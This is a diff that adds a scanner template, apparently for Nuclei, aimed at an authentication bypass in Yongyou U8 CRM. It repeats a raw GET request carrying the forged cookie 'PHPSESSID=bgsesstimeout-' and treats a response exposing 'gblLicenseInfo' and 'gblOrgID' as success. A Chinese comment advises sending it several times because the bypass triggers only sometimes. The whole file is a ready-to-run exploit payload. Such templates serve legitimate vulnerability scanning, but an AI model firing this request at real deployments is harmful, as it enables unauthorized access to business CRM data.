@@ -1,0 +1,54 @@
+id: yongyou-u8-crm-bgsesstimeout-bypass
+info:
+  name: yongyou-u8-crm-bgsesstimeout-bypass
+  author: msk
+  severity: high
+
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Sec-Purpose: prefetch;prerender
+        Purpose: prefetch
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Cookie: PHPSESSID=bgsesstimeout-
+        Connection: close
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Sec-Purpose: prefetch;prerender
+        Purpose: prefetch
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Cookie: PHPSESSID=bgsesstimeout-
+        Connection: close
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Sec-Purpose: prefetch;prerender
+        Purpose: prefetch
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Cookie: PHPSESSID=bgsesstimeout-
+        Connection: close
+        
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"gblLicenseInfo","gblOrgID")
+          
+#概率性触发，多发包几次
